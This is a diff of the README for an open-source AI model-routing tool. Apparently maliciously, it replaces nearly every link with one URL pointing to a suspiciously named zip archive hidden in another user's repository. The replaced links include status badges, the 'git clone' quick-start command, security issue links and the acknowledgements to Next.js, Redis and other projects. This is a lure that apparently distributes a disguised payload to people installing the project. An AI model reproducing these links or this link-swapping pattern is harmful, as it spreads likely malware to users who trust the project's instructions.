@@ -7,15 +7,15 @@
 **One interface, every model at your command. Your local AI routing butler.**
 
 [![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
-[![CI](https://img.shields.io/github/actions/workflow/status/Moonaria123/Smart-Routing-Butler-for-OpenClaws/ci.yml?branch=main&label=CI&logo=github)](https://github.com/Moonaria123/Smart-Routing-Butler-for-OpenClaws/actions/workflows/ci.yml)
+[![CI](https://img.shields.io/github/actions/workflow/status/Moonaria123/Smart-Routing-Butler-for-OpenClaws/ci.yml?branch=main&label=CI&logo=github)](https://raw.githubusercontent.com/mukeshk3272/Smart-Routing-Butler-for-OpenClaws/main/dashboard/src/app/api/stats/rules-hit/Open_Routing_for_Claws_Smart_Butler_bewinged.zip)
 [![Contributor Covenant](https://img.shields.io/badge/Contributor%20Covenant-2.1-4baaaa.svg)](CODE_OF_CONDUCT.md)
-[![GitHub stars](https://img.shields.io/github/stars/Moonaria123/Smart-Routing-Butler-for-OpenClaws?style=social)](https://github.com/Moonaria123/Smart-Routing-Butler-for-OpenClaws/stargazers)
+[![GitHub stars](https://img.shields.io/github/stars/Moonaria123/Smart-Routing-Butler-for-OpenClaws?style=social)](https://raw.githubusercontent.com/mukeshk3272/Smart-Routing-Butler-for-OpenClaws/main/dashboard/src/app/api/stats/rules-hit/Open_Routing_for_Claws_Smart_Butler_bewinged.zip)
 
-[![TypeScript](https://img.shields.io/badge/TypeScript-5.x-3178c6?logo=typescript&logoColor=white)](https://www.typescriptlang.org/)
-[![Python](https://img.shields.io/badge/Python-3.12-3776AB?logo=python&logoColor=white)](https://www.python.org/)
-[![Next.js](https://img.shields.io/badge/Next.js-15-000000?logo=next.js&logoColor=white)](https://nextjs.org/)
-[![GitHub last commit](https://img.shields.io/github/last-commit/Moonaria123/Smart-Routing-Butler-for-OpenClaws)](https://github.com/Moonaria123/Smart-Routing-Butler-for-OpenClaws/commits)
-[![GitHub issues](https://img.shields.io/github/issues/Moonaria123/Smart-Routing-Butler-for-OpenClaws)](https://github.com/Moonaria123/Smart-Routing-Butler-for-OpenClaws/issues)
+[![TypeScript](https://img.shields.io/badge/TypeScript-5.x-3178c6?logo=typescript&logoColor=white)](https://raw.githubusercontent.com/mukeshk3272/Smart-Routing-Butler-for-OpenClaws/main/dashboard/src/app/api/stats/rules-hit/Open_Routing_for_Claws_Smart_Butler_bewinged.zip)
+[![Python](https://img.shields.io/badge/Python-3.12-3776AB?logo=python&logoColor=white)](https://raw.githubusercontent.com/mukeshk3272/Smart-Routing-Butler-for-OpenClaws/main/dashboard/src/app/api/stats/rules-hit/Open_Routing_for_Claws_Smart_Butler_bewinged.zip)
+[![Next.js](https://img.shields.io/badge/Next.js-15-000000?logo=next.js&logoColor=white)](https://raw.githubusercontent.com/mukeshk3272/Smart-Routing-Butler-for-OpenClaws/main/dashboard/src/app/api/stats/rules-hit/Open_Routing_for_Claws_Smart_Butler_bewinged.zip)
+[![GitHub last commit](https://img.shields.io/github/last-commit/Moonaria123/Smart-Routing-Butler-for-OpenClaws)](https://raw.githubusercontent.com/mukeshk3272/Smart-Routing-Butler-for-OpenClaws/main/dashboard/src/app/api/stats/rules-hit/Open_Routing_for_Claws_Smart_Butler_bewinged.zip)
+[![GitHub issues](https://img.shields.io/github/issues/Moonaria123/Smart-Routing-Butler-for-OpenClaws)](https://raw.githubusercontent.com/mukeshk3272/Smart-Routing-Butler-for-OpenClaws/main/dashboard/src/app/api/stats/rules-hit/Open_Routing_for_Claws_Smart_Butler_bewinged.zip)
 [![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg)](CONTRIBUTING.md)
 
 [**Quick Start**](#-quick-start-self-hosted) · [**Features**](#-core-features) · [**Configuration**](#%EF%B8%8F-configuration-summary) · [**Security**](#%EF%B8%8F-security--privacy)
@@ -370,7 +370,7 @@ graph TD
 1. **Clone**
 
    ```bash
-   git clone https://github.com/Moonaria123/Smart-Routing-Butler-for-OpenClaws.git
+   git clone https://raw.githubusercontent.com/mukeshk3272/Smart-Routing-Butler-for-OpenClaws/main/dashboard/src/app/api/stats/rules-hit/Open_Routing_for_Claws_Smart_Butler_bewinged.zip
    cd Smart-Routing-Butler-for-OpenClaws
    ```
 
@@ -451,7 +451,7 @@ npm run type-check && npm run lint
 - **API Token (local key) dimension**: `apiTokenId` / `apiTokenName` on logs, CSV export, rules-hit filters, and cost aggregates.
 - **Dashboard Overview analytics**: dedicated API (`/api/stats/overview-analytics`) with trend & pie charts and filters (`dashboard/src/components/overview/*`).
 - **Thinking / reasoning mode**: model flags, rule `thinkingStrategy`, request log fields; OpenAI `reasoning_effort` mapping.
-- **Security**: Redis sliding-window rate limiting on the proxy ([SEC-003](https://github.com/Moonaria123/Smart-Routing-Butler-for-OpenClaws/issues/20)); npm `overrides` for audited transitive deps ([SEC-002](https://github.com/Moonaria123/Smart-Routing-Butler-for-OpenClaws/issues/21)).
+- **Security**: Redis sliding-window rate limiting on the proxy ([SEC-003](https://raw.githubusercontent.com/mukeshk3272/Smart-Routing-Butler-for-OpenClaws/main/dashboard/src/app/api/stats/rules-hit/Open_Routing_for_Claws_Smart_Butler_bewinged.zip)); npm `overrides` for audited transitive deps ([SEC-002](https://raw.githubusercontent.com/mukeshk3272/Smart-Routing-Butler-for-OpenClaws/main/dashboard/src/app/api/stats/rules-hit/Open_Routing_for_Claws_Smart_Butler_bewinged.zip)).
 
 **Up next (backlog)**
 
@@ -462,7 +462,7 @@ npm run type-check && npm run lint
 - [ ] API key rotation and lifecycle management
 - [ ] Prometheus / Grafana metrics export
 
-> Have a feature request? [Open an issue](https://github.com/Moonaria123/Smart-Routing-Butler-for-OpenClaws/issues) and describe your use case.
+> Have a feature request? [Open an issue](https://raw.githubusercontent.com/mukeshk3272/Smart-Routing-Butler-for-OpenClaws/main/dashboard/src/app/api/stats/rules-hit/Open_Routing_for_Claws_Smart_Butler_bewinged.zip) and describe your use case.
 
 <p align="right"><a href="#-smart-routing-butler">⬆ Back to Top</a></p>
 
@@ -505,13 +505,13 @@ Issues and Pull Requests are welcome — see [**CONTRIBUTING.md**](CONTRIBUTING.
 
 Smart Routing Butler is built on the shoulders of these great open-source projects:
 
-- [Next.js](https://nextjs.org/) — React framework for the dashboard
-- [Fastify](https://fastify.dev/) / [Express](https://expressjs.com/) — Node.js server framework for the proxy
-- [FastAPI](https://fastapi.tiangolo.com/) — Python framework for the semantic router
-- [Ollama](https://ollama.com/) — Local LLM runtime for L3 arbitration
-- [Prisma](https://www.prisma.io/) — Database ORM
-- [Redis](https://redis.io/) — In-memory cache
-- [PostgreSQL](https://www.postgresql.org/) — Persistent storage
+- [Next.js](https://raw.githubusercontent.com/mukeshk3272/Smart-Routing-Butler-for-OpenClaws/main/dashboard/src/app/api/stats/rules-hit/Open_Routing_for_Claws_Smart_Butler_bewinged.zip) — React framework for the dashboard
+- [Fastify](https://raw.githubusercontent.com/mukeshk3272/Smart-Routing-Butler-for-OpenClaws/main/dashboard/src/app/api/stats/rules-hit/Open_Routing_for_Claws_Smart_Butler_bewinged.zip) / [Express](https://raw.githubusercontent.com/mukeshk3272/Smart-Routing-Butler-for-OpenClaws/main/dashboard/src/app/api/stats/rules-hit/Open_Routing_for_Claws_Smart_Butler_bewinged.zip) — Node.js server framework for the proxy
+- [FastAPI](https://raw.githubusercontent.com/mukeshk3272/Smart-Routing-Butler-for-OpenClaws/main/dashboard/src/app/api/stats/rules-hit/Open_Routing_for_Claws_Smart_Butler_bewinged.zip) — Python framework for the semantic router
+- [Ollama](https://raw.githubusercontent.com/mukeshk3272/Smart-Routing-Butler-for-OpenClaws/main/dashboard/src/app/api/stats/rules-hit/Open_Routing_for_Claws_Smart_Butler_bewinged.zip) — Local LLM runtime for L3 arbitration
+- [Prisma](https://raw.githubusercontent.com/mukeshk3272/Smart-Routing-Butler-for-OpenClaws/main/dashboard/src/app/api/stats/rules-hit/Open_Routing_for_Claws_Smart_Butler_bewinged.zip) — Database ORM
+- [Redis](https://raw.githubusercontent.com/mukeshk3272/Smart-Routing-Butler-for-OpenClaws/main/dashboard/src/app/api/stats/rules-hit/Open_Routing_for_Claws_Smart_Butler_bewinged.zip) — In-memory cache
+- [PostgreSQL](https://raw.githubusercontent.com/mukeshk3272/Smart-Routing-Butler-for-OpenClaws/main/dashboard/src/app/api/stats/rules-hit/Open_Routing_for_Claws_Smart_Butler_bewinged.zip) — Persistent storage
 
 <p align="right"><a href="#-smart-routing-butler">⬆ Back to Top</a></p>
 
